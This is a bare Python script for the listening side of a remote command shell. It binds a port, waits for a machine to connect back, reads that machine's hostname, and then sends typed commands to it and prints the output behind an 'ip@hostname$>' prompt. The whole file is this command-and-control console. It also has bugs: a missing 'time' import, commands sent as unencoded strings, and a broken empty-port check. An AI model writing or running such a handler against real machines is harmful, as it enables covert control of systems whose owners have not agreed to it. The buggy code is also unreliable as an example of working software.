import socket
import os
import sys
def netCreate():
    #socketCreate
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = int(input("Type the port for listening: ")) #raw_input
        if port == '':
            netCreate()
        port = int(port)
    except socket.error as msg:
        print("Socket creation error: " + str(msg[0]))
def netBind():
    #socketBind
    try:
        print("Binding Socket at port %s"%port)
        #s.bind will bind socket to the designated port
        s.bind((host,port))
        print("[!] Binded socket at target port %s"%port)
        s.listen(1)
    except socket.error as msg:
        print("Socket binding error encounted: " + str(msg[0]))
        time.sleep(1)
        print("Retrying Process")
        netBind()
def netAccept():
    #socketAccept
    global conn
    global address
    global hostname
    try:
        conn, address = s.accept()
        print("[!] Session Started on %s:%s"%(address[0],address[1]))
        print("\n")
        #will assign variable hostname to the hostname of remote client
        hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        #msg can be anything you want it to be
        print("Socket accepting error: " + str(msg[0]))
def menu():
    while 1:
        cmd = input(str(address[0])+'@' + str(hostname) + '$> ')
        if cmd == 'quit':
            #closes connection
            conn.close()
            #closes socket
            s.close()
            #exits program
            sys.exit()
        elif cmd == "hi":
            print("meme")
        command = conn.send(cmd)
        result = conn.recv(16834)
        if result != hostname:
            print(result)
def main():
    netCreate()
    netBind()
    netAccept()
main()
